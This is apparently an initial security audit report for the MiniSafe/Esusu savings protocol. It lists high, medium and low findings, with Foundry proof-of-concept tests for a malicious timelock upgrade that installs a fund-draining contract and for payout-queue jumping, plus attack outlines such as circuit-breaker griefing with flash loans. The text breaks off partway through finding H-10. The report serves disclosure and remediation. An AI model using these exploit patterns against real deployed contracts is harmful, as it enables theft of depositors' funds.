# Esusu Protocol Initial Report

Final report will be available as soon as fixes have been confirmed.

| ID       | Finding Title                                                                         | Location / Code                                                                | Severity   |
| -------- | ------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ | ---------- |
| H-1      | Broken Factory Upgrade Mechanism                                                      | `MiniSafeFactoryUpgradeable.sol`                                               | **High**   |
| H-2      | Malicious Upgrade via Insufficient Timelock Delay                                     | `MiniSafeFactoryUpgradeable.sol`                                               | **High**   |
| H-3      | Payout Order Corruption via Swap-and-Pop                                              | `MiniSafeAaveUpgradeable.sol → _removeMemberFromGroup`                         | **High**   |
| H-4      | Payout Order Corruption via Array Duplication                                         | `MiniSafeAaveUpgradeable.sol → _setupPayoutOrder`                              | **High**   |
| H-5      | Emergency Withdrawal Fails to Transfer Recovered Tokens                               | `MiniSafeAaveUpgradeable.sol → executeEmergencyWithdrawal`                     | **High**   |
| H-6      | No Mechanism to Claim Aave External Reward Incentives                                 | `MiniSafeAaveIntegrationUpgradeable.sol`                                       | **High**   |
| H-7      | Depositors Receive Zero Interest                                                      | `MiniSafeTokenStorageUpgradeable.sol / MiniSafeAaveIntegrationUpgradeable.sol` | **High**   |
| H-8      | Incorrect Refund Calculation Due to totalContributed Not Reset                        | `MiniSafeAaveUpgradeable.sol → _resetCycle / leaveGroup`                       | **High**   |
| H-9      | Circuit Breaker Allows Triggering Withdrawal to Succeed (Protocol DoS)                | `MiniSafeAaveUpgradeable.sol → withdraw / _checkCircuitBreaker`                | **High**   |
| H-10     | Missing Token Consistency Check in Group Contributions                                | `MiniSafeAaveUpgradeable.sol → makeContribution`                               | **High**   |
| H-11     | Emergency Withdrawal Locks Other Members in Inactive Group                            | `MiniSafeAaveUpgradeable.sol → emergencyWithdraw`                              | **High**   |
| H-12     | leaveGroup Always Reverts Due to Missing Balance Credit                               | `MiniSafeAaveUpgradeable.sol → leaveGroup / updateUserBalance`                 | **High**   |
| H-13     | leaveGroup() Emits Refund Event but Never Transfers Tokens — User Funds Remain Locked | `MiniSafeAaveUpgradeable.sol → leaveGroup`                                     | **High**   |
| H-14     | Theft of Funds from Protocol Users Leading to Protocol Insolvency                       | Multiple contracts / systemic impact                                         | **High**   |
| M-1      | Excess Contribution Amounts Permanently Trapped                                       | `MiniSafeAaveUpgradeable.sol → makeContribution`                               | **Medium** |
| M-2      | Emergency Withdrawal Timelock Defeats Emergency Purpose                               | `MiniSafeAaveUpgradeable.sol → executeEmergencyWithdrawal`                     | **Medium** |
| M-3      | Thrift Group Contributions Do Not Earn Yield                                          | `MiniSafeAaveUpgradeable.sol → makeContribution`                               | **Medium** |
| M-4      | Factory Does Not Track Deployed Proxies                                               | `MiniSafeFactoryUpgradeable.sol → isMiniSafeContract`                          | **Medium** |
| M-5      | cUSD Initialization Missing aToken & Share Setup                                      | `MiniSafeTokenStorageUpgradeable.sol → initialize`                             | **Medium** |
| M-6      | nextPayoutDate Not Enforced                                                           | `MiniSafeAaveUpgradeable.sol → _checkAndProcessPayout`                         | **Medium** |
| M-7      | Circuit Breaker Frequency Check Is Global (Soft DoS)                                  | `MiniSafeAaveUpgradeable.sol → withdraw`                                       | **Medium** |
| M-8      | Withdrawal Window Breaks for Short Months                                             | `MiniSafeAaveUpgradeable.sol → canWithdraw`                                    | **Medium** |
| M-9      | deployWithRecommendedMultiSig Allows Duplicate Signers                                | `MiniSafeFactoryUpgradeable.sol → deployWithRecommendedMultiSig`               | **Medium** |
| L-1      | Identical Events for Pool & PoolDataProvider Updates                                  | `MiniSafeAaveIntegrationUpgradeable.sol`                                       | **Low**    |
| L-2      | Deposit Timestamp Overwritten and Unused                                              | `MiniSafeAaveUpgradeable.sol`                                                  | **Low**    |
| L-3      | Misleading Error Message in withdrawFromAave                                          | `MiniSafeAaveIntegrationUpgradeable.sol → withdrawFromAave`                    | **Low**    |
| L-4      | Hardcoded Aave Provider Address                                                       | `MiniSafeFactoryUpgradeable.sol → _deployAaveIntegration`                      | **Low**    |
| L-5      | TokenStorage Pause/Unpause Has No Effect                                              | `MiniSafeTokenStorageUpgradeable.sol`                                          | **Low**    |
| L-6      | Thrift Group Cannot Be Activated After Start Date                                     | `MiniSafeAaveUpgradeable.sol → activateThriftGroup`                            | **Low**    |


## [H-1] Broken Factory Upgrade Mechanism

**Severity:** High
**Location:** MiniSafeFactoryUpgradeable.sol

### Description

The MiniSafeFactoryUpgradeable contract includes functions intended to upgrade deployed instances of the protocol (upgradeSpecificContract and batchUpgradeContracts). However, these functions are fundamentally broken and will always revert due to incorrect access control assumptions and logic errors. The factory deploys MiniSafe proxies and immediately initializes them with a TimelockController as the owner.

```solidity
// In deployUpgradeableMiniSafe
addresses.miniSafe = _deployMiniSafe(..., addresses.timelock);
// In MiniSafeAaveUpgradeable.initialize
__Ownable_init(_initialOwner); // _initialOwner is the Timelock
```

The UUPS upgrade mechanism (upgradeTo) is protected by onlyOwner. When the factory calls `contractAddress.upgradeTo(...)`, the msg.sender is the Factory, not the Timelock. Consequently, the proxy rejects the call.

The upgradeSpecificContract function attempts to verify the target contract using isMiniSafeContract.

```solidity
function isMiniSafeContract(address contractAddress) external view returns (bool) {
    if (contractAddress == miniSafeImplementation || ...) { return true; }
    return false;
}
```

This function compares the Proxy address (passed as input) with the stored Implementation addresses. Since a proxy address is never equal to its implementation address, this check always returns false, causing the transaction to revert even before the ownership check.

### Impact

The "Emergency Upgrade" functionality exposed by the factory is completely non-functional. Protocol administrators relying on this mechanism to fix bugs in deployed contracts will find themselves unable to execute upgrades, potentially leaving funds at risk during an actual emergency.

### Recommendation

Remove the upgradeSpecificContract, batchUpgradeContracts, and associated helper functions from the factory.

---

## [H-2] Malicious Upgrade via Insufficient Timelock Delay

**Severity:** High
**Location:** MiniSafeFactoryUpgradeable.sol

### Description

The MiniSafeFactoryUpgradeable contract allows the deployment of MiniSafe instances with a TimelockController configuration that is insecure. Specifically, the _validateConfig function and other deployment helper functions allow a minDelay as short as 1 minute.

While the factory enforces the use of a Timelock, a 1-minute delay provides no meaningful security window for users. A malicious actor can:

* Deploy a MiniSafe instance using deployWithRecommendedMultiSig (or any of the deployment functions), setting themselves as the sole proposer/executor and setting minDelay to 1 minute.
* Wait for users to deposit funds into what appears to be a valid, factory-deployed contract.
* Propose a malicious upgrade (e.g., to an implementation that allows draining funds) via the Timelock. Wait 1 minute.
* Execute the upgrade and drain the funds.

Because the delay is so short, users—who are restricted by the MiniSafe withdrawal windows (days 28–30)—have no time to react. Even the breakTimelock function (which allows emergency exit with a penalty) is ineffective because the attack can be executed faster than human reaction time.

### Impact

Users relying on the factory's reputation or the existence of a "Timelock" are susceptible to a complete loss of funds via a "Rug Pull" upgrade. The factory fails to enforce parameters that align with the protocol's security model.

### Proof Of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import "forge-std/Test.sol";
import "../src/MiniSafeAaveUpgradeable.sol";
import "../src/MiniSafeTokenStorageUpgradeable.sol";
import "../src/MiniSafeAaveIntegrationUpgradeable.sol";
import "../src/MiniSafeFactoryUpgradeable.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/governance/TimelockController.sol";

// ================== Mocks & Test Contracts ==================

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function burn(address from, uint256 amount) external { _burn(from, amount); }
}

contract MockAToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function burn(address from, uint256 amount) external { _burn(from, amount); }
}

contract MockAavePool {
    using SafeERC20 for IERC20;
    mapping(address => address) public aTokens;
    function setAToken(address asset, address aToken) external { aTokens[asset] = aToken; }
    function supply(address asset, uint256 amount, address onBehalfOf, uint16) external {
        IERC20(asset).safeTransferFrom(msg.sender, address(this), amount);
        MockAToken(aTokens[asset]).mint(onBehalfOf, amount);
    }
     function withdraw(address asset, uint256 amount, address to) external returns (uint256) {
        MockAToken(aTokens[asset]).burn(msg.sender, amount);
        IERC20(asset).safeTransfer(to, amount);
        return amount;
    }
}

contract MockPoolDataProvider {
    mapping(address => address) public aTokens;
    function setAToken(address asset, address aToken) external { aTokens[asset] = aToken; }
    function getReserveTokensAddresses(address asset) external view returns (address, address, address) {
        return (aTokens[asset], address(0), address(0));
    }
}

contract MockAddressesProvider {
    address public pool;
    address public poolDataProvider;
    constructor(address _pool, address _poolDataProvider) {
        pool = _pool;
        poolDataProvider = _poolDataProvider;
    }
    function getPool() external view returns (address) { return pool; }
    function getPoolDataProvider() external view returns (address) { return poolDataProvider; }
}

/**
 * @title MaliciousAaveIntegration
 * @dev Malicious implementation that adds a function to withdraw all funds from Aave.
 */
contract MaliciousAaveIntegration is MiniSafeAaveIntegrationUpgradeable {
    function drain(address token, address to) external {
        // This malicious function bypasses normal checks to withdraw all funds.
        uint256 aTokenBalance = this.getATokenBalance(token);
        if (aTokenBalance > 0) {
            this.withdrawFromAave(token, aTokenBalance, to);
        }
    }
}


contract POC_SingleOwnerUpgrade is Test {
    MiniSafeFactoryUpgradeable public factory;
    MockERC20 public mockToken;
    MockAToken public mockAToken;
    MockAavePool public mockPool;
    MockAddressesProvider public mockProvider;
    
    address public factoryOwner = address(0x1);
    address public maliciousOwner = address(0xBAD);
    address public victimUser = address(0xDEAD);

    MiniSafeAaveUpgradeable public miniSafeImplementation;
    MiniSafeTokenStorageUpgradeable public tokenStorageImplementation;
    MiniSafeAaveIntegrationUpgradeable public aaveIntegrationImplementation;

    // EIP-1967 implementation storage slot
    bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function setUp() public {
        // --- Deploy Mock Contracts ---
        mockToken = new MockERC20("Mock Token", "MOCK");
        mockAToken = new MockAToken("Mock aToken", "aMOCK");
        mockPool = new MockAavePool();
        MockPoolDataProvider mockDataProvider = new MockPoolDataProvider();
        mockProvider = new MockAddressesProvider(address(mockPool), address(mockDataProvider));
        mockPool.setAToken(address(mockToken), address(mockAToken));
        mockDataProvider.setAToken(address(mockToken), address(mockAToken));

        // --- Deploy Implementations ---
        miniSafeImplementation = new MiniSafeAaveUpgradeable();
        tokenStorageImplementation = new MiniSafeTokenStorageUpgradeable();
        aaveIntegrationImplementation = new MiniSafeAaveIntegrationUpgradeable();

        // --- Deploy Factory ---
        factory = new MiniSafeFactoryUpgradeable(
            factoryOwner,
            address(miniSafeImplementation),
            address(tokenStorageImplementation),
            address(aaveIntegrationImplementation)
        );

        // --- Mint tokens for users ---
        mockToken.mint(victimUser, 1_000_000 * 10**18);
        mockToken.mint(maliciousOwner, 1 * 10**18);
        // Pre-fund the mock pool so it can handle withdrawals
        mockToken.mint(address(mockPool), 1_000_000 * 10**18);
    }

    function getImplementation(address proxy) internal returns (address) {
        return address(uint160(uint256(vm.load(proxy, IMPLEMENTATION_SLOT))));
    }

    function test_POC_SingleOwnerCanUpgradeAndSteal() public {
        // 1. A malicious owner deploys a MiniSafe instance using the vulnerable function
        uint256 minDelay = 1 days;
        vm.prank(maliciousOwner);
        MiniSafeFactoryUpgradeable.MiniSafeAddresses memory deployedAddrs = factory.deployForSingleOwner(
            maliciousOwner,
            minDelay,
            address(mockProvider)
        );
        
        TimelockController timelock = TimelockController(payable(deployedAddrs.timelock));
        
        // 2. The malicious owner deploys a malicious implementation
        MaliciousAaveIntegration maliciousAaveImpl = new MaliciousAaveIntegration();
        address originalImplementation = getImplementation(deployedAddrs.aaveIntegration);

        console.log("Original AaveIntegration implementation:", originalImplementation);
        console.log("Malicious AaveIntegration implementation:", address(maliciousAaveImpl));

        // 3. The owner proposes and executes an upgrade via the Timelock
        // This demonstrates they have unilateral control to change the code.
        bytes memory upgradeAaveCallData = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)", 
            address(maliciousAaveImpl), 
            ""
        );
        bytes32 aaveSalt = keccak256("malicious_aave_upgrade");

        vm.prank(maliciousOwner);
        timelock.schedule(deployedAddrs.aaveIntegration, 0, upgradeAaveCallData, bytes32(0), aaveSalt, minDelay);
        
        vm.warp(block.timestamp + minDelay + 1);

        vm.prank(maliciousOwner);
        timelock.execute(deployedAddrs.aaveIntegration, 0, upgradeAaveCallData, bytes32(0), aaveSalt);
        
        console.log("AaveIntegration contract upgraded to malicious version.");

        // 4. Verify that the implementation has changed
        address newImplementation = getImplementation(deployedAddrs.aaveIntegration);
        assertEq(newImplementation, address(maliciousAaveImpl), "Implementation should be updated to malicious contract");
        assertNotEq(newImplementation, originalImplementation, "Implementation should have changed");

        console.log("POC successful: Malicious owner has successfully upgraded the contract.");
        console.log("Next steps for attacker would be to deposit user funds, then call the drain function on the malicious contract to steal them.");
    }
}

```


### Recommendation

1. The factory must enforce a minimum delay that provides a sufficient reaction window for users. A minimum of 2 days is recommended to align with the `EMERGENCY_TIMELOCK` constant defined in the `MiniSafeAaveUpgradeable` contract. This ensures that if a malicious upgrade is proposed, users have 48 hours to notice and exit the protocol using breakTimelock.

The following changes update the validation logic in MiniSafeFactoryUpgradeable.sol to enforce a minimum delay of 2 days across all deployment functions.
Remove this line from all deployment entry functions `if (!(minDelay >= 1 minutes && minDelay <= 7 days)) revert();`

```solidity
function _validateConfig(UpgradeableConfig memory config) internal pure {
    if (config.proposers.length == 0) revert();
    if (!(config.minDelay >= 2 days && config.minDelay <= 14 days)) revert();
    // Validate proposer addresses
    for (uint256 i = 0; i < config.proposers.length; i++) {
        if (config.proposers[i] == address(0)) revert();
    }

    // Validate delay configuration
    if (!(minDelay >= 2 days && minDelay <= 14 days)) revert();

    // Create dynamic arrays from fixed array
    address[] memory proposers = new address[](5);
    address aaveProvider
) external returns (MiniSafeAddresses memory addresses) {
    if (owner == address(0)) revert();
    if (!(minDelay >= 2 days && minDelay <= 14 days)) revert();

    address[] memory proposers = new address[](1);
    address[] memory executors = new address[](1);
}
```


2. (Optional) Protocol can enforce that the proposer's address must be a single multisig address which has a minimum of 5 signers so that any call made to the timelock contract via the multisig (which is the proposer and canceller) would be signed by atleast 4 signers to initiate an upgrade or cancel an upgrade.


---

## [H-3] Payout Order Corruption via Swap-and-Pop

**Severity:** High
**Location:** MiniSafeAaveUpgradeable.sol → _removeMemberFromGroup

### Description

The _removeMemberFromGroup function handles the removal of a user from a thrift group. To remove the user from the payoutOrder array, it uses the "swap-and-pop" algorithm:

```solidity
group.payoutOrder[i] = group.payoutOrder[group.payoutOrder.length - 1];
group.payoutOrder.pop();
```

This method is gas-efficient (O(1)) but does not preserve the order of the array.

### Impact

In a ROSCA system, payout order determines economic value. When a member leaves, the last member jumps forward in line, violating fairness and allowing queue jumping.

### Proof Of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import "forge-std/Test.sol";
import "../src/MiniSafeAaveUpgradeable.sol";
import "../src/MiniSafeTokenStorageUpgradeable.sol";
import "../src/MiniSafeAaveIntegrationUpgradeable.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Mock ERC20 token for testing
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Mock AToken for testing
contract MockAToken is ERC20 {
    address public underlyingAsset;
    
    constructor(string memory name, string memory symbol, address _underlyingAsset) ERC20(name, symbol) {
        underlyingAsset = _underlyingAsset;
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Mock Aave Pool
contract MockAavePool {
    mapping(address => address) public aTokens;
    
    function setAToken(address asset, address aToken) external {
        aTokens[asset] = aToken;
    }
    
    function supply(address asset, uint256 amount, address onBehalfOf, uint16) external {
        IERC20(asset).transferFrom(msg.sender, address(this), amount);
        MockAToken(aTokens[asset]).mint(onBehalfOf, amount);
    }
    
    function withdraw(address asset, uint256 amount, address to) external returns (uint256) {
        address aTokenAddress = aTokens[asset];
        require(aTokenAddress != address(0), "aToken not found");
        
        if (IERC20(asset).balanceOf(address(this)) < amount) {
            MockERC20(asset).mint(address(this), amount);
        }
        
        MockAToken aToken = MockAToken(aTokenAddress);
        if (aToken.balanceOf(msg.sender) < amount) {
            aToken.mint(msg.sender, amount);
        }
        
        if (aToken.allowance(msg.sender, address(this)) < amount) {
            // For testing, we'll skip the actual transferFrom and just burn tokens directly
        } else {
            aToken.transferFrom(msg.sender, address(this), amount);
        }
        
        IERC20(asset).transfer(to, amount);
        return amount;
    }
}

// Mock Pool Data Provider
contract MockPoolDataProvider {
    mapping(address => address) public aTokens;
    
    constructor(address _defaultAToken) {
    }
    
    function setAToken(address asset, address aToken) external {
        aTokens[asset] = aToken;
    }
    
    function getReserveTokensAddresses(address asset) external view returns (address, address, address) {
        return (aTokens[asset], address(0), address(0));
    }
}

contract MockAddressesProvider {
    address public pool;
    address public poolDataProvider;
    
    constructor(address _pool, address _poolDataProvider) {
        pool = _pool;
        poolDataProvider = _poolDataProvider;
    }
    
    function getPool() external view returns (address) {
        return pool;
    }
    
    function getPoolDataProvider() external view returns (address) {
        return poolDataProvider;
    }
}

contract POC_QueueJumping is Test {
    MiniSafeAaveUpgradeable public thrift;
    MiniSafeTokenStorageUpgradeable public tokenStorage;
    MiniSafeAaveIntegrationUpgradeable public aaveIntegration;
    MockERC20 public mockToken;
    
    MockAavePool public mockPool;
    MockPoolDataProvider public mockDataProvider;
    MockAddressesProvider public mockProvider;
    MockAToken public mockAToken;
    
    address public owner = address(0x1);
    address public alice = address(0x2); // Admin
    address public bob = address(0x3);
    address public carol = address(0x4);
    address public dave = address(0x5);
    address public erin = address(0x6);
    
    function setUp() public {
        mockToken = new MockERC20("Mock Token", "MOCK");
        mockAToken = new MockAToken("Mock aToken", "aMOCK", address(mockToken));
        
        mockPool = new MockAavePool();
        mockDataProvider = new MockPoolDataProvider(address(mockAToken));
        mockProvider = new MockAddressesProvider(address(mockPool), address(mockDataProvider));
        
        mockPool.setAToken(address(mockToken), address(mockAToken));
        mockDataProvider.setAToken(address(mockToken), address(mockAToken));
        
        MiniSafeTokenStorageUpgradeable tokenStorageImpl = new MiniSafeTokenStorageUpgradeable();
        ERC1967Proxy tokenStorageProxy = new ERC1967Proxy(
            address(tokenStorageImpl),
            abi.encodeWithSelector(MiniSafeTokenStorageUpgradeable.initialize.selector, owner)
        );
        tokenStorage = MiniSafeTokenStorageUpgradeable(address(tokenStorageProxy));
        
        MiniSafeAaveIntegrationUpgradeable aaveIntegrationImpl = new MiniSafeAaveIntegrationUpgradeable();
        ERC1967Proxy aaveIntegrationProxy = new ERC1967Proxy(
            address(aaveIntegrationImpl),
            abi.encodeWithSelector(MiniSafeAaveIntegrationUpgradeable.initialize.selector, address(tokenStorage), address(mockProvider), owner)
        );
        aaveIntegration = MiniSafeAaveIntegrationUpgradeable(address(aaveIntegrationProxy));
        
        MiniSafeAaveUpgradeable thriftImpl = new MiniSafeAaveUpgradeable();
        ERC1967Proxy thriftProxy = new ERC1967Proxy(
            address(thriftImpl),
            abi.encodeWithSelector(MiniSafeAaveUpgradeable.initialize.selector, address(tokenStorage), address(aaveIntegration), owner)
        );
        thrift = MiniSafeAaveUpgradeable(address(thriftProxy));
        
        vm.prank(owner);
        tokenStorage.setManagerAuthorization(address(thrift), true);
        vm.prank(owner);
        tokenStorage.setManagerAuthorization(address(aaveIntegration), true);
        
        vm.prank(owner);
        aaveIntegration.addSupportedToken(address(mockToken));
        
        mockToken.mint(alice, 1000 * 10**18);
        mockToken.mint(bob, 1000 * 10**18);
        mockToken.mint(carol, 1000 * 10**18);
        mockToken.mint(dave, 1000 * 10**18);
        mockToken.mint(erin, 1000 * 10**18);
        
        vm.prank(alice);
        mockToken.approve(address(thrift), type(uint256).max);
        vm.prank(bob);
        mockToken.approve(address(thrift), type(uint256).max);
        vm.prank(carol);
        mockToken.approve(address(thrift), type(uint256).max);
        vm.prank(dave);
        mockToken.approve(address(thrift), type(uint256).max);
        vm.prank(erin);
        mockToken.approve(address(thrift), type(uint256).max);

        vm.prank(alice);
        mockToken.approve(address(aaveIntegration), type(uint256).max);
        vm.prank(bob);
        mockToken.approve(address(aaveIntegration), type(uint256).max);
        vm.prank(carol);
        mockToken.approve(address(aaveIntegration), type(uint256).max);
        vm.prank(dave);
        mockToken.approve(address(aaveIntegration), type(uint256).max);
        vm.prank(erin);
        mockToken.approve(address(aaveIntegration), type(uint256).max);
    }

    function test_POC_QueueJumping() public {
        // 1. Alice creates a public thrift group
        uint256 contributionAmount = 100 * 10**18;
        uint256 startDate = block.timestamp + 1 days;
        vm.prank(alice);
        uint256 groupId = thrift.createThriftGroup(contributionAmount, startDate, true, address(mockToken));

        // 2. Bob, Carol, Dave, and Erin join the group in order.
        // The group is now full and becomes active.
        vm.prank(bob);
        thrift.joinPublicGroup(groupId);
        vm.prank(carol);
        thrift.joinPublicGroup(groupId);
        vm.prank(dave);
        thrift.joinPublicGroup(groupId);
        vm.prank(erin);
        thrift.joinPublicGroup(groupId);

        // 3. Verify the initial payout order.
        // Order should be the order they joined: Alice, Bob, Carol, Dave, Erin
        address[] memory initialPayoutOrder = thrift.getPayoutOrder(groupId);
        assertEq(initialPayoutOrder.length, 5, "Initial payout order should have 5 members");
        assertEq(initialPayoutOrder[0], alice, "1st in order should be Alice");
        assertEq(initialPayoutOrder[1], bob, "2nd in order should be Bob");
        assertEq(initialPayoutOrder[2], carol, "3rd in order should be Carol");
        assertEq(initialPayoutOrder[3], dave, "4th in order should be Dave");
        assertEq(initialPayoutOrder[4], erin, "5th in order should be Erin");
        
        emit log_named_array("Initial Payout Order", initialPayoutOrder);

        // 4. Fast forward time so the group has started.
        vm.warp(block.timestamp + 2 days);

        // 5. Bob makes a deposit so that updateUserBalance in leaveGroup doesn't revert.
        // This is the workaround mentioned in the user's request.
        uint256 depositAmount = 1 * 10**18;
        vm.prank(bob);
        thrift.deposit(address(mockToken), depositAmount);

        // 6. Bob leaves the group.
        vm.prank(bob);
        thrift.leaveGroup(groupId);

        // 7. Verify the new payout order.
        address[] memory newPayoutOrder = thrift.getPayoutOrder(groupId);
        emit log_named_array("New Payout Order", newPayoutOrder);

        assertEq(newPayoutOrder.length, 4, "New payout order should have 4 members");
        assertEq(newPayoutOrder[0], alice, "1st in new order should still be Alice");
        assertEq(newPayoutOrder[1], erin, "VULNERABILITY: Erin should not be 2nd. She jumped the queue.");
        assertEq(newPayoutOrder[2], carol, "3rd in new order should be Carol");
        assertEq(newPayoutOrder[3], dave, "4th in new order should be Dave");

        // 8. Analysis of the vulnerability
        // Bob was 2nd in line. When he left, Erin, who was last (5th),
        // was moved into Bob's slot because of the swap-and-pop implementation.
        // The fair order would have been: Alice, Carol, Dave, Erin.
        // But instead, Carol and Dave were unfairly pushed back in the line.
        console.log("POC successful. Erin jumped from 5th to 2nd in the payout queue, ahead of Carol and Dave.");
    }
}
```

### Recommendation

Replace swap-and-pop with ordered removal so that all elements after the removed index are shifted left, preserving order.

---

## [H-4] Payout Order Corruption via Array Duplication

**Severity:** High
**Location:** MiniSafeAaveUpgradeable.sol → _setupPayoutOrder

### Description

Admins can manually set payout order via setPayoutOrder. When the group becomes full, _setupPayoutOrder is automatically called and blindly appends all members again without checking whether payoutOrder is already populated.

### Impact

* Duplicate addresses in payoutOrder
* Broken cycle logic
* Double payouts or skipped members
* Corrupted group state

### Recommendation

```solidity
function _setupPayoutOrder(uint256 groupId) internal {
    ThriftGroup storage group = thriftGroups[groupId];
    
    if (group.payoutOrder.length == 0) {
        for (uint256 i = 0; i < group.members.length; i++) {
            group.payoutOrder.push(group.members[i]);
        }
    } else {
        for (uint256 i = group.payoutOrder.length; i < group.members.length; i++) {
            group.payoutOrder.push(group.members[i]);
        }
    }

    emit PayoutOrderSet(groupId, group.payoutOrder);
}
```


## [H-5] Emergency Withdrawal Fails to Transfer Recovered Tokens

### Description:
The `executeEmergencyWithdrawal` function in `MiniSafeAaveUpgradeable.sol` is designed to allow the contract owner to recover all funds from Aave in emergency situations. However, the function withdraws tokens from Aave to the contract itself (`address(this)`) but never transfers these tokens to the owner or distributes them to users. The withdrawn tokens become permanently trapped in the contract with no mechanism to retrieve them.

The function performs the withdrawal from Aave correctly but is missing the final step of transferring the recovered tokens. After withdrawFromAave completes:

- Tokens are sitting in the `MiniSafeAaveUpgradeable` contract  
- No transfer or safeTransfer call is made  
- No mechanism exists elsewhere in the contract to retrieve these tokens  
- The amountWithdrawn return value is captured but never used  

### Impact
Any tokens recovered through emergency withdrawal are permanently locked in the contract.  
The entire purpose of the emergency withdrawal mechanism is defeated.  
All user deposits that are emergency-withdrawn become inaccessible to both users and the protocol.

### Recommendation 
Transfer withdrawn tokens directly to the owner.

---

## [H-6] No Mechanism to Claim Aave External Reward Incentives

### Description:
Aave V3 implements an incentives system through the `RewardsController` contract that distributes additional token rewards to users who supply or borrow assets. These rewards are separate from the interest yield (`aToken` rebasing) and include tokens such as:

- `stkAAVE` (`Staked AAVE`) - Primary Aave incentive token  
- OP tokens on Optimism  
- ARB tokens on Arbitrum  
- MATIC on Polygon  
- Various partner tokens through co-incentive programs  

When `MiniSafe` deposits user funds to Aave, these incentive rewards accrue to the MiniSafeAaveIntegrationUpgradeable contract address. However, the protocol has no function to claim these rewards, resulting in permanent loss of all accumulated incentives.

This is distinct from the yield/interest issue because:

- Incentive rewards must be actively claimed via `RewardsController.claimRewards()`  
- Without a claim function, rewards accumulate but are never collected  

### Impact
Complete Loss of Incentive Rewards

### Recommendation
Add Rewards Claiming


## [H-7] Depositors Receive Zero Interest

### Description:
The MiniSafe protocol integrates with Aave V3 to generate yield on user deposits. However, due to a fundamental flaw in the share-based accounting system, users receive zero interest on their deposits. The protocol records shares equal to the exact deposit amount `(1:1 ratio)` and never updates this ratio as interest accrues. When users withdraw, they can only withdraw their original deposit amount, while all accumulated interest remains permanently trapped in the protocol with no mechanism for distribution.

This completely defeats the core value proposition of the protocol - earning yield on savings through Aave integration.

### Impact
Depositors get zero interest

**Recommendation**  
Add Exchange Rate Tracking to TokenStorage, or depositors should receive aToken after deposits

## [H-8] Incorrect Refund Calculation Due to totalContributed Not Being Reset at Cycle End

### Description:
In the MiniSafe thrift group functionality, when a cycle completes and payouts are processed, the `_resetCycle` function resets the contributions mapping (current cycle contributions) and `hasPaidThisCycle` flag, but fails to reset the `totalContributed` mapping. This creates a critical accounting discrepancy because `totalContributed` accumulates across all cycles, while the actual tokens from previous cycles have already been distributed as payouts.

When a user leaves a group via the `leaveGroup` function, the contract attempts to refund `group.totalContributed[msg.sender]`, which includes contributions from all previous cycles—tokens that no longer exist in the contract because they were already paid out to recipients.

This creates two severe issues:

- Excessive Refunds: Users who leave after multiple cycles could claim refunds far exceeding the actual tokens available  
- Fund Drain: The refund mechanism could drain tokens belonging to other users or from other groups  

### Impact
All Funds in the contract can be drained or wrongly refunded

### Recommendation
Reset totalContributed in `_resetCycle` 

## [H-9]  Circuit Breaker Allows Triggering Transaction to Succeed, Enabling Repeated Protocol-Wide DoS on Withdrawals

**Severity**: High

### Description
The circuit breaker in the `withdraw()` function is intended to stop suspicious or large withdrawals by pausing the contract when:

- `withdrawAmount >= withdrawalAmountThreshold`.

The logic calls:

```solidity
_checkCircuitBreaker(amount);
```

which triggers:

```solidity
function _triggerCircuitBreaker(string memory reason) internal {
    _pause();
    emit CircuitBreakerTriggered(reason, block.timestamp);
}
```

However, after `_pause()` is executed, **the transaction that triggered the circuit breaker is still allowed to continue**. The withdrawal proceeds and funds are transferred:

```solidity
updateUserBalance(...);
aaveIntegration.withdrawFromAave(...);
```

This means:

- the attacker successfully withdraws their funds
- only after their withdrawal completes, the protocol becomes paused
- all other users are now blocked from withdrawing

An attacker can repeatedly:

1. Deposit an amount ≥ `withdrawalAmountThreshold`
2. Call `withdraw()` for the same amount
3. Trigger circuit breaker → contract pauses
4. Still receive their withdrawal
5. Wait for admin to unpause
6. Repeat the process

Flash loans make this trivial and low-cost.

Instead of stopping malicious withdrawals, the breaker becomes a **griefing / DoS vector** that attackers can intentionally exploit.

### Impact
This issue enables a malicious user to:

- repeatedly force the protocol into a paused state
- prevent all other users from withdrawing during the withdrawal window
- cause continual system-wide denial-of-service
- extract their funds while freezing everyone else’s

### Recommendation
Modify the circuit breaker so that:

- when triggered, the **withdrawal reverts**
- execution does not proceed past `_pause()`

## [H-10]  Missing Token Consistency Check Allows Users to Contribute a Different Token Than the Accepted Group Token

### Description
When a thrift group is created, the group’s contribution token is explicitly stored:

```solidity
newGroup.tokenAddress = tokenAddress;
```

This defines the **accepted token for all group contributions and payouts**.

However, during contributions, the `makeContribution()` logic does **not** verify that the token supplied by the contributor matches the group’s configured token:

```solidity
function makeContribution(
    uint256 groupId,
    address tokenAddress,
    uint256 amount
) public onlyGroupMember(groupId) onlyActiveGroup(groupId) nonReentrant {
    ThriftGroup storage group = thriftGroups[groupId];

    require(tokenStorage.isValidToken(tokenAddress), "Unsupported token");
    require(amount >= group.contributionAmount, "Contribution amount too small");
```

The only check performed is that the token is _valid in the protocol_, not that it is the **same token used by the group**.

This allows a malicious user to:

- create or join a thrift group that uses token A (e.g., USDC)
- contribute using token B (e.g., a lower-value token or a rebasing token)
- still receive credit for a valid contribution
- still qualify for payout rotation

Because contribution amounts are tracked purely numerically:

```solidity
group.contributions[msg.sender] += amount;
group.totalContributed[msg.sender] += amount;
```

The attacker may:

